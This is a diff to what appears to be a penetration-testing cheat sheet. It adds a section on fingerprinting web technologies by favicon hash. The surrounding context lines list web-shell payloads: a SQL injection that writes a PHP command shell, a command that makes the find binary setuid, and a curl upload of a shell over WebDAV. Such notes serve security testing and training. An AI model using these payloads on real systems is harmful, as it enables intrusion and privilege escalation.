@@ -14,6 +14,7 @@
 - [Reverse engineering](#reverse-engineering)
 - [File upload](#file-upload)
 - [Shells](#shells)
+- [More stuff](#more-stuff)
 
 ## Glossary
 
@@ -351,3 +352,11 @@ If something goes wrong
 - `echo "<?php system('chmod +x /usr/bin/find; chmod +s /usr/bin/find');?>" >index.php`
 - `' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'`
 - `curl -T my-shell.php -u 'administrant:sleepless' http://muddy.ugc/webdav/`
+
+
+
+## More stuff
+
+**To identify technologies**
+- Using favicons: `subfinder -d target.com | httpx -favicon -j | jq -r .favicon | grep -v null | sort -u`
+  - Spring Boot > `116323821`
